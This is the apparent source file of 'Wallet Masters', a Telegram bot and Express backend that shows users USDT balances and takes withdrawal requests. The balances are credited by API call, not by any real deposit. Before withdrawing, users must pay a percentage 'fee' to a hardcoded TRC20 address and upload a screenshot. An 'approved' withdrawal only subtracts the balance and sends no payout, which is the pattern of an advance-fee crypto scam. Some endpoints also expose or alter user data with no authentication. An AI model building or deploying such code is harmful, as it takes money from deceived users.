/**
 * Wallet Masters — Telegram Bot Backend
 * Node.js + node-telegram-bot-api + Express + lowdb (pure JS)
 * Admin Chat ID: 5995434559
 * Fee Address: TPwUS8v77TtcsYZUHUTvVx2TGqE37QnagZ
 */

require('dotenv').config();
const TelegramBot = require('node-telegram-bot-api');
const express     = require('express');
const cors        = require('cors');
const path        = require('path');

const {
  getOrCreateUser, getUserByTelegramId, getUserById,
  getEarningApps, getEarningAppById, addEarningApp,
  connectUID, getConnectedUID, getUserConnections,
  findUserByExternalUID,
  getUserTransactions, calculateFees,
  createWithdrawalRequest, getPendingWithdrawals,
  getWithdrawalById, updateWithdrawal, updateUserBalance,
  createTransaction, getStats
} = require('./database');

const BOT_TOKEN     = process.env.BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
const BOT_USERNAME  = process.env.BOT_USERNAME || 'walletmastersbot';
const FEE_ADDRESS   = process.env.FEE_ADDRESS  || 'TPwUS8v77TtcsYZUHUTvVx2TGqE37QnagZ';
const PORT          = parseInt(process.env.PORT) || 3000;

if (!BOT_TOKEN)     { console.error('❌ BOT_TOKEN missing'); process.exit(1); }
if (!ADMIN_CHAT_ID) { console.error('❌ ADMIN_CHAT_ID missing'); process.exit(1); }

const bot = new TelegramBot(BOT_TOKEN, { polling: true });
const app = express();

app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.static(path.join(__dirname, '.')));

// ─── Dynamic Mini App URL ─────────────────────────────────────────────────────
// Uses the Render URL automatically — no need to set MINI_APP_URL manually
let MINI_APP_URL = process.env.MINI_APP_URL || '';

app.listen(PORT, "0.0.0.0", () => {
  if (!MINI_APP_URL) {
    // Auto-detect on Railway/Render
    const host = process.env.RENDER_EXTERNAL_URL || process.env.RAILWAY_STATIC_URL || '';
    if (host) MINI_APP_URL = host.startsWith('http') ? host : `https://${host}`;
  }
  console.log(`🚀 Wallet Masters running on port ${PORT}`);
  console.log(`🌐 Mini App URL: ${MINI_APP_URL || 'Not set yet'}`);
});

// ─── Keyboards ────────────────────────────────────────────────────────────────

function mainMenu() {
  const buttons = [
    [{ text: '📋 My Transactions' }, { text: '🔗 Connect Earning App' }],
    [{ text: '🆔 My UID & Address' }, { text: '📞 Support' }]
  ];
  if (MINI_APP_URL) {
    buttons.unshift([{ text: '💎 Open Wallet', web_app: { url: MINI_APP_URL } }]);
  }
  return { reply_markup: { keyboard: buttons, resize_keyboard: true } };
}

const adminMenu = {
  reply_markup: {
    keyboard: [
      [{ text: '📋 Pending Withdrawals' }, { text: '➕ Add Earning App' }],
      [{ text: '📱 List Earning Apps' },   { text: '💰 Fee Address' }],
      [{ text: '👥 User Stats' }]
    ],
    resize_keyboard: true
  }
};

function approveRejectKeyboard(wrId) {
  return {
    reply_markup: {
      inline_keyboard: [[
        { text: '✅ APPROVE', callback_data: `approve_${wrId}` },
        { text: '❌ REJECT',  callback_data: `reject_${wrId}` }
      ]]
    }
  };
}

// ─── /start ───────────────────────────────────────────────────────────────────

bot.onText(/\/start/, async (msg) => {
  const { id, username, first_name, last_name } = msg.from;
  const fullName = [first_name, last_name].filter(Boolean).join(' ');
  const user = getOrCreateUser(id, username, fullName);
  const isAdmin = String(id) === String(ADMIN_CHAT_ID);

  const welcomeText = `
💎 *Welcome to Wallet Masters!*

Hello *${fullName}*! Your crypto wallet is ready.

━━━━━━━━━━━━━━━━━━━━
🆔 *Wallet UID:* \`${user.uid}\`
📬 *TRC20 Address:* \`${user.trc20_address}\`
💰 *USDT Balance:* \`${user.usdt_balance.toFixed(2)} USDT\`
━━━━━━━━━━━━━━━━━━━━

${MINI_APP_URL ? '👇 Tap *Open Wallet* to access your dashboard.' : '⚠️ Wallet launching soon — stay tuned!'}
  `.trim();

  await bot.sendMessage(id, welcomeText, {
    parse_mode: 'Markdown',
    ...(isAdmin ? adminMenu : mainMenu())
  });
});

// ─── My Transactions ──────────────────────────────────────────────────────────

bot.onText(/📋 My Transactions/, async (msg) => {
  const user = getUserByTelegramId(msg.from.id);
  if (!user) return bot.sendMessage(msg.from.id, 'Please tap /start first.');

  const txs = getUserTransactions(user.id, 10);
  if (!txs.length) {
    return bot.sendMessage(msg.from.id, '📭 *No transactions yet.*\n\nDeposit USDT to your wallet to get started!', { parse_mode: 'Markdown' });
  }

  let text = '📋 *Recent Transactions*\n\n';
  txs.forEach((tx) => {
    const date = new Date(tx.created_at * 1000).toLocaleString();
    const icon = tx.type === 'deposit' ? '⬇️' : '⬆️';
    const statusIcon = { completed: '✅', pending: '⏳', approved: '✅', rejected: '❌', awaiting_fee: '💳', fee_paid: '🔍' }[tx.status] || '⏳';
    text += `${icon} *${tx.type.toUpperCase()}* · ${tx.amount} ${tx.currency || 'USDT'}\n`;
    text += `   ${statusIcon} ${tx.status.replace(/_/g,' ').toUpperCase()}\n`;
    if (tx.source_app) text += `   📱 From: ${tx.source_app}\n`;
    text += `   📅 ${date}\n`;
    text += `   🔗 \`${(tx.tx_hash || '').slice(0, 14)}...\`\n\n`;
  });

  bot.sendMessage(msg.from.id, text, { parse_mode: 'Markdown' });
});

// ─── My UID & Address ─────────────────────────────────────────────────────────

bot.onText(/🆔 My UID & Address/, async (msg) => {
  const user = getUserByTelegramId(msg.from.id);
  if (!user) return;

  bot.sendMessage(msg.from.id, `
🆔 *Your Wallet Details*

━━━━━━━━━━━━━━━━━━━━
📌 *Wallet UID:*
\`${user.uid}\`

📬 *TRC20 USDT Address:*
\`${user.trc20_address}\`

💰 *Balance:* ${user.usdt_balance.toFixed(2)} USDT
━━━━━━━━━━━━━━━━━━━━

Use your UID to receive earnings from connected apps.
  `.trim(), { parse_mode: 'Markdown' });
});

// ─── Connect Earning App ──────────────────────────────────────────────────────

bot.onText(/🔗 Connect Earning App/, async (msg) => {
  const apps = getEarningApps();
  if (!apps.length) {
    return bot.sendMessage(msg.from.id, '📭 *No earning apps available yet.*\n\nCheck back soon — more apps are being verified!', { parse_mode: 'Markdown' });
  }

  const buttons = apps.map(a => ([{ text: `💰 ${a.name}`, callback_data: `connect_app_${a.id}` }]));
  bot.sendMessage(msg.from.id, '🔗 *Available Earning Apps*\n\nSelect an app to connect your UID:', {
    parse_mode: 'Markdown',
    reply_markup: { inline_keyboard: buttons }
  });
});

// ─── Support ──────────────────────────────────────────────────────────────────

bot.onText(/📞 Support/, (msg) => {
  const user = getUserByTelegramId(msg.from.id);
  bot.sendMessage(msg.from.id, `
📞 *Wallet Masters Support*

For help with:
• Withdrawal issues
• Deposit delays
• UID connection problems

Please describe your issue and we'll respond shortly.

🆔 Your Wallet UID: \`${user?.uid || 'N/A'}\`
  `.trim(), { parse_mode: 'Markdown' });
});

// ─── Admin: Pending Withdrawals ───────────────────────────────────────────────

bot.onText(/📋 Pending Withdrawals/, async (msg) => {
  if (String(msg.from.id) !== String(ADMIN_CHAT_ID)) return;
  const pending = getPendingWithdrawals();
  if (!pending.length) return bot.sendMessage(msg.from.id, '✅ No pending withdrawals at the moment.');

  await bot.sendMessage(msg.from.id, `📋 *${pending.length} Pending Withdrawal(s):*`, { parse_mode: 'Markdown' });
  for (const wr of pending) await sendWithdrawalToAdmin(wr);
});

// ─── Admin: List Earning Apps ─────────────────────────────────────────────────

bot.onText(/📱 List Earning Apps/, async (msg) => {
  if (String(msg.from.id) !== String(ADMIN_CHAT_ID)) return;
  const apps = getEarningApps();
  if (!apps.length) return bot.sendMessage(msg.from.id, '📭 No earning apps added yet.');

  let text = `📱 *Earning Apps (${apps.length})*\n\n`;
  apps.forEach(a => {
    text += `• *${a.name}* (ID: ${a.id})\n`;
    if (a.description) text += `  ${a.description}\n`;
    text += `  🔑 Token: \`${a.token.slice(0, 10)}...\`\n\n`;
  });
  bot.sendMessage(msg.from.id, text, { parse_mode: 'Markdown' });
});

// ─── Admin: Fee Address ───────────────────────────────────────────────────────

bot.onText(/💰 Fee Address/, (msg) => {
  if (String(msg.from.id) !== String(ADMIN_CHAT_ID)) return;
  bot.sendMessage(msg.from.id, `💰 *Fee Collection Address (TRC20/USDT):*\n\n\`${FEE_ADDRESS}\`\n\nAll withdrawal fees are directed here.`, { parse_mode: 'Markdown' });
});

// ─── Admin: User Stats ────────────────────────────────────────────────────────

bot.onText(/👥 User Stats/, (msg) => {
  if (String(msg.from.id) !== String(ADMIN_CHAT_ID)) return;
  const stats = getStats();
  bot.sendMessage(msg.from.id, `
👥 *Wallet Masters Stats*

━━━━━━━━━━━━━━━━━━━━
👤 Total Users: *${stats.totalUsers}*
📊 Total Transactions: *${stats.totalTransactions}*
⏳ Pending Withdrawals: *${stats.pendingWithdrawals}*
💰 Total Wallet Balances: *${stats.totalBalance} USDT*
━━━━━━━━━━━━━━━━━━━━
  `.trim(), { parse_mode: 'Markdown' });
});

// ─── Admin: Add Earning App flow ──────────────────────────────────────────────

const pendingActions = {};

bot.onText(/➕ Add Earning App/, (msg) => {
  if (String(msg.from.id) !== String(ADMIN_CHAT_ID)) return;
  pendingActions[msg.from.id] = { step: 'add_app_name' };
  bot.sendMessage(msg.from.id, '📱 *Add Earning App — Step 1/3*\n\nEnter the *name* of the Earning App:', {
    parse_mode: 'Markdown',
    reply_markup: { force_reply: true }
  });
});

// ─── General message handler ──────────────────────────────────────────────────

bot.on('message', async (msg) => {
  const uid    = msg.from.id;
  const text   = msg.text || '';
  const action = pendingActions[uid];

  if (!action) return;

  // ── Admin: Add Earning App ──
  if (action.step === 'add_app_name') {
    pendingActions[uid] = { step: 'add_app_token', name: text.trim() };
    return bot.sendMessage(uid, `✅ Name: *${text.trim()}*\n\n*Step 2/3:* Enter the Bot Token of this earning app:`, { parse_mode: 'Markdown' });
  }

  if (action.step === 'add_app_token') {
    pendingActions[uid] = { step: 'add_app_desc', name: action.name, token: text.trim() };
    return bot.sendMessage(uid, `✅ Token saved.\n\n*Step 3/3:* Enter a short description (or type \`skip\`):`, { parse_mode: 'Markdown' });
  }

  if (action.step === 'add_app_desc') {
    const desc = text.trim().toLowerCase() === 'skip' ? '' : text.trim();
    try {
      const newApp = addEarningApp(action.name, action.token, desc);
      delete pendingActions[uid];
      return bot.sendMessage(uid, `
✅ *Earning App Added!*

📱 *Name:* ${newApp.name}
🔑 *ID:* ${newApp.id}
📝 *Description:* ${newApp.description || 'None'}

Users can now connect their UID from this app in Wallet Masters!
      `.trim(), { parse_mode: 'Markdown' });
    } catch (e) {
      delete pendingActions[uid];
      return bot.sendMessage(uid, `❌ Error: ${e.message}`);
    }
  }

  // ── User: Enter UID for app connection ──
  if (action.step === 'enter_uid') {
    const user = getUserByTelegramId(uid);
    if (!user) { delete pendingActions[uid]; return; }

    const externalUID = text.trim();
    if (!externalUID || externalUID.length < 3) {
      return bot.sendMessage(uid, '❌ *Invalid UID.* Please enter a valid UID from your earning app.', { parse_mode: 'Markdown' });
    }

    connectUID(user.id, action.appId, externalUID);
    const app = getEarningAppById(action.appId);
    delete pendingActions[uid];

    return bot.sendMessage(uid, `
✅ *UID Connected Successfully!*

📱 *App:* ${app?.name || 'Unknown'}
🔑 *Your UID:* \`${externalUID}\`

Your earnings from *${app?.name}* will now be automatically credited to your Wallet Masters balance!
    `.trim(), { parse_mode: 'Markdown' });
  }

  // ── User: Withdrawal address ──
  if (action.step === 'withdraw_address') {
    const address = text.trim();
    if (!address.startsWith('T') || address.length < 30) {
      return bot.sendMessage(uid, '❌ *Invalid TRC20 address.* Must start with T and be 34 characters.\n\nPlease enter a valid USDT TRC20 address:', { parse_mode: 'Markdown' });
    }
    pendingActions[uid] = { ...action, step: 'withdraw_amount', address };
    return bot.sendMessage(uid, `✅ Address saved.\n\n💰 *Enter the amount you want to withdraw (USDT):*`, { parse_mode: 'Markdown' });
  }

  if (action.step === 'withdraw_amount') {
    const amount = parseFloat(text.trim());
    const user = getUserByTelegramId(uid);

    if (isNaN(amount) || amount <= 0) {
      return bot.sendMessage(uid, '❌ *Invalid amount.* Please enter a valid number:', { parse_mode: 'Markdown' });
    }
    if (amount > (user?.usdt_balance || 0)) {
      return bot.sendMessage(uid, `❌ *Insufficient balance.*\n\nYour balance: ${user?.usdt_balance.toFixed(2)} USDT\nRequested: ${amount} USDT`, { parse_mode: 'Markdown' });
    }
    if (amount < 1) {
      return bot.sendMessage(uid, '❌ *Minimum withdrawal is 1 USDT.*', { parse_mode: 'Markdown' });
    }

    const fees = calculateFees(amount);
    const net  = parseFloat((amount - fees.totalFee).toFixed(2));

    pendingActions[uid] = { ...action, step: 'withdraw_confirm', amount, fees, net };

    return bot.sendMessage(uid, `
💎 *Withdrawal Summary*

━━━━━━━━━━━━━━━━━━━━
📤 *Amount:* ${amount} USDT
📬 *To Address:* \`${action.address}\`
🌐 *Network:* TRC20

━━━━━━━━━━━━━━━━━━━━
⛽ *Gas Fee (40%):* ${fees.gasFee} USDT
🏦 *Gateway Fee (60%):* ${fees.gatewayFee} USDT
💸 *Total Fee (10%):* ${fees.totalFee} USDT
━━━━━━━━━━━━━━━━━━━━
✅ *You Receive:* ${net} USDT

📌 Fee payment address:
\`${FEE_ADDRESS}\`

Reply *CONFIRM* to proceed or *CANCEL* to abort.
    `.trim(), { parse_mode: 'Markdown' });
  }

  if (action.step === 'withdraw_confirm') {
    if (text.trim().toUpperCase() === 'CANCEL') {
      delete pendingActions[uid];
      return bot.sendMessage(uid, '❌ Withdrawal cancelled.', mainMenu());
    }
    if (text.trim().toUpperCase() !== 'CONFIRM') {
      return bot.sendMessage(uid, 'Please reply *CONFIRM* to proceed or *CANCEL* to abort.', { parse_mode: 'Markdown' });
    }

    const user = getUserByTelegramId(uid);
    const wr = createWithdrawalRequest({
      user_id: user.id,
      to_address: action.address,
      network: 'TRC20',
      currency: 'USDT',
      amount: action.amount,
      gas_fee: action.fees.gasFee,
      gateway_fee: action.fees.gatewayFee,
      total_fee: action.fees.totalFee
    });

    pendingActions[uid] = { step: 'upload_receipt', wrId: wr.id };

    return bot.sendMessage(uid, `
✅ *Withdrawal Request Created!*

🆔 *Request ID:* #${wr.id}

━━━━━━━━━━━━━━━━━━━━
💸 *Fee to Pay:* ${action.fees.totalFee} USDT
📬 *Pay to:* \`${FEE_ADDRESS}\`
🌐 *Network:* TRC20 (USDT)
━━━━━━━━━━━━━━━━━━━━

👉 Send the fee to the address above, then *upload your payment screenshot* here to proceed.
    `.trim(), { parse_mode: 'Markdown' });
  }

  // ── User: Upload receipt photo ──
  if (action.step === 'upload_receipt' && msg.photo) {
    const fileId = msg.photo[msg.photo.length - 1].file_id;
    const wr = getWithdrawalById(action.wrId);
    if (!wr) { delete pendingActions[uid]; return; }

    updateWithdrawal(action.wrId, { status: 'fee_paid', receipt_file_id: fileId });
    delete pendingActions[uid];

    bot.sendMessage(uid, `
📤 *Receipt Submitted!*

Your payment receipt has been sent to the admin for verification.
⏱ Processing time: *10-30 minutes*

🆔 Request ID: #${wr.id}
    `.trim(), { parse_mode: 'Markdown', ...mainMenu() });

    // Notify admin
    const user = getUserByTelegramId(uid);
    const fullWr = getWithdrawalById(action.wrId);
    await bot.sendMessage(ADMIN_CHAT_ID, `
🔔 *New Fee Receipt Received!*

👤 *User:* ${user?.full_name || 'Unknown'} (@${user?.telegram_username || 'N/A'})
🆔 *Wallet UID:* ${user?.uid}
🔢 *Request ID:* #${wr.id}

━━━━━━━━━━━━━━━━━━━━
💰 *Amount:* ${wr.amount} USDT
📬 *To:* \`${wr.to_address}\`
⛽ *Gas Fee:* ${wr.gas_fee} USDT
🏦 *Gateway Fee:* ${wr.gateway_fee} USDT
💸 *Total Fee:* ${wr.total_fee} USDT
━━━━━━━━━━━━━━━━━━━━
    `.trim(), { parse_mode: 'Markdown' });

    await bot.sendPhoto(ADMIN_CHAT_ID, fileId, {
      caption: `Receipt for Withdrawal Request #${wr.id}`,
      ...approveRejectKeyboard(action.wrId)
    });

    return;
  }

  if (action.step === 'upload_receipt' && !msg.photo) {
    return bot.sendMessage(uid, '📸 Please send a *photo/screenshot* of your payment receipt.', { parse_mode: 'Markdown' });
  }
});

// ─── Callback Query Handler ───────────────────────────────────────────────────

bot.on('callback_query', async (query) => {
  const { data, from, message } = query;
  const uid = from.id;

  // ── Connect App: select app ──
  if (data.startsWith('connect_app_')) {
    const appId = parseInt(data.replace('connect_app_', ''));
    const app = getEarningAppById(appId);
    if (!app) return bot.answerCallbackQuery(query.id, { text: 'App not found.' });

    const user = getUserByTelegramId(uid);
    const existing = getConnectedUID(user?.id, appId);

    pendingActions[uid] = { step: 'enter_uid', appId };

    await bot.answerCallbackQuery(query.id);
    return bot.sendMessage(uid, `
🔗 *Connect to ${app.name}*

${existing ? `⚠️ You already have UID \`${existing.external_uid}\` connected. Entering a new one will replace it.\n\n` : ''}Enter your *UID* from *${app.name}*:

💡 You can find your UID in the ${app.name} app settings or profile page.
    `.trim(), { parse_mode: 'Markdown' });
  }

  // ── Withdraw button from Mini App ──
  if (data === 'start_withdrawal') {
    const user = getUserByTelegramId(uid);
    if (!user) return;
    if (user.usdt_balance <= 0) {
      await bot.answerCallbackQuery(query.id, { text: 'Insufficient balance.' });
      return bot.sendMessage(uid, '❌ You have no USDT balance to withdraw.', mainMenu());
    }
    pendingActions[uid] = { step: 'withdraw_address' };
    await bot.answerCallbackQuery(query.id);
    return bot.sendMessage(uid, `
💎 *Start Withdrawal*

Your balance: *${user.usdt_balance.toFixed(2)} USDT*

📬 Enter your *TRC20 USDT wallet address* to receive funds:
    `.trim(), { parse_mode: 'Markdown' });
  }

  // ── Admin: Approve ──
  if (data.startsWith('approve_') && String(uid) === String(ADMIN_CHAT_ID)) {
    const wrId = parseInt(data.replace('approve_', ''));
    const wr = getWithdrawalById(wrId);
    if (!wr) return bot.answerCallbackQuery(query.id, { text: 'Request not found.' });
    if (wr.status === 'approved') return bot.answerCallbackQuery(query.id, { text: 'Already approved.' });

    updateWithdrawal(wrId, { status: 'approved' });
    updateUserBalance(wr.user_id, -wr.amount);

    await bot.answerCallbackQuery(query.id, { text: '✅ Approved!' });
    await bot.editMessageCaption(`✅ APPROVED — Withdrawal #${wrId}`, {
      chat_id: message.chat.id,
      message_id: message.message_id
    });

    // Notify user
    await bot.sendMessage(wr.telegram_id, `
✅ *Withdrawal Approved!*

🎉 Your withdrawal of *${wr.amount} USDT* has been approved and is being processed.

📬 *Destination:* \`${wr.to_address}\`
🌐 *Network:* TRC20
⏱ *Estimated:* 5–30 minutes

Thank you for using Wallet Masters! 💎
    `.trim(), { parse_mode: 'Markdown' });
    return;
  }

  // ── Admin: Reject ──
  if (data.startsWith('reject_') && String(uid) === String(ADMIN_CHAT_ID)) {
    const wrId = parseInt(data.replace('reject_', ''));
    const wr = getWithdrawalById(wrId);
    if (!wr) return bot.answerCallbackQuery(query.id, { text: 'Request not found.' });
    if (wr.status === 'rejected') return bot.answerCallbackQuery(query.id, { text: 'Already rejected.' });

    updateWithdrawal(wrId, { status: 'rejected' });

    await bot.answerCallbackQuery(query.id, { text: '❌ Rejected.' });
    await bot.editMessageCaption(`❌ REJECTED — Withdrawal #${wrId}`, {
      chat_id: message.chat.id,
      message_id: message.message_id
    });

    await bot.sendMessage(wr.telegram_id, `
❌ *Withdrawal Rejected*

Your withdrawal request #${wrId} has been rejected.

Possible reasons:
• Invalid fee payment receipt
• Incorrect fee amount sent
• Duplicate submission

Please contact support if you believe this is an error.
    `.trim(), { parse_mode: 'Markdown' });
    return;
  }

  bot.answerCallbackQuery(query.id);
});

// ─── Helper: Send withdrawal card to admin ────────────────────────────────────

async function sendWithdrawalToAdmin(wr) {
  const text = `
📤 *Withdrawal Request #${wr.id}*

👤 *User:* ${wr.full_name} (@${wr.telegram_username || 'N/A'})
🆔 *Wallet UID:* ${wr.wallet_uid}
📅 *Date:* ${new Date(wr.created_at * 1000).toLocaleString()}

━━━━━━━━━━━━━━━━━━━━
💰 *Amount:* ${wr.amount} USDT
📬 *To:* \`${wr.to_address}\`
🌐 *Network:* ${wr.network}
⛽ *Gas Fee:* ${wr.gas_fee} USDT
🏦 *Gateway Fee:* ${wr.gateway_fee} USDT
💸 *Total Fee:* ${wr.total_fee} USDT
📊 *Status:* ${wr.status.replace(/_/g, ' ').toUpperCase()}
━━━━━━━━━━━━━━━━━━━━
  `.trim();

  await bot.sendMessage(ADMIN_CHAT_ID, text, {
    parse_mode: 'Markdown',
    ...approveRejectKeyboard(wr.id)
  });
}

// ─── REST API: Deposit from Earning App ───────────────────────────────────────

app.post('/api/deposit', async (req, res) => {
  try {
    const { app_token, external_uid, amount, currency } = req.body;

    if (!app_token || !external_uid || !amount) {
      return res.status(400).json({ success: false, error: 'Missing required fields: app_token, external_uid, amount' });
    }

    const earningApp = require('./database').getEarningAppByToken(app_token);
    if (!earningApp || !earningApp.is_active) {
      return res.status(403).json({ success: false, error: 'Unauthorized app token' });
    }

    const user = findUserByExternalUID(earningApp.id, external_uid);
    if (!user) {
      return res.status(404).json({ success: false, error: 'UID not connected to any Wallet Masters account' });
    }

    const depositAmount = parseFloat(amount);
    if (isNaN(depositAmount) || depositAmount <= 0) {
      return res.status(400).json({ success: false, error: 'Invalid amount' });
    }

    updateUserBalance(user.id, depositAmount);
    const tx = createTransaction({
      user_id: user.id,
      type: 'deposit',
      amount: depositAmount,
      currency: currency || 'USDT',
      network: 'TRC20',
      source_app: earningApp.name,
      source_uid: external_uid,
      status: 'completed'
    });

    // Notify user via Telegram
    await bot.sendMessage(user.telegram_id, `
💰 *New Deposit Received!*

✅ *+${depositAmount} ${currency || 'USDT'}* credited to your wallet

📱 *From:* ${earningApp.name}
🔑 *Your UID:* ${external_uid}
🔗 *TX:* \`${tx.tx_hash.slice(0, 20)}...\`

💎 *New Balance:* ${(getUserByTelegramId(user.telegram_id)?.usdt_balance || 0).toFixed(2)} USDT
    `.trim(), { parse_mode: 'Markdown' });

    return res.json({
      success: true,
      tx_hash: tx.tx_hash,
      credited_amount: depositAmount,
      user_uid: user.uid,
      message: `Deposit of ${depositAmount} ${currency || 'USDT'} credited to ${user.full_name || user.telegram_username}`
    });

  } catch (err) {
    console.error('Deposit error:', err);
    return res.status(500).json({ success: false, error: 'Internal server error' });
  }
});

// ─── REST API: Get wallet info (for Mini App) ─────────────────────────────────

app.get('/api/wallet/:telegramId', (req, res) => {
  const user = getUserByTelegramId(req.params.telegramId);
  if (!user) return res.status(404).json({ error: 'User not found' });

  const txs = require('./database').getUserTransactions(user.id, 20);
  const connections = getUserConnections(user.id);

  res.json({
    uid: user.uid,
    trc20_address: user.trc20_address,
    usdt_balance: user.usdt_balance,
    full_name: user.full_name,
    transactions: txs,
    connections
  });
});

// ─── REST API: Get earning apps (for Mini App) ────────────────────────────────

app.get('/api/apps', (req, res) => {
  res.json(getEarningApps());
});

// ─── REST API: Verify UID connection (for Mini App) ───────────────────────────

app.post('/api/connect-uid', (req, res) => {
  const { telegram_id, app_id, external_uid } = req.body;
  if (!telegram_id || !app_id || !external_uid) {
    return res.status(400).json({ success: false, error: 'Missing fields' });
  }

  const user = getUserByTelegramId(telegram_id);
  if (!user) return res.status(404).json({ success: false, error: 'User not found' });

  const app = getEarningAppById(app_id);
  if (!app) return res.status(404).json({ success: false, error: 'App not found' });

  connectUID(user.id, app_id, external_uid);
  res.json({ success: true, message: `UID ${external_uid} connected to ${app.name}` });
});

// ─── Health check ─────────────────────────────────────────────────────────────

app.get('/health', (req, res) => {
  res.json({ status: 'ok', service: 'Wallet Masters', timestamp: new Date().toISOString() });
});

// ─── Error handling ───────────────────────────────────────────────────────────

bot.on('polling_error', (err) => console.error('Polling error:', err.message));
process.on('uncaughtException', (err) => console.error('Uncaught Exception:', err));
process.on('unhandledRejection', (err) => console.error('Unhandled Rejection:', err));
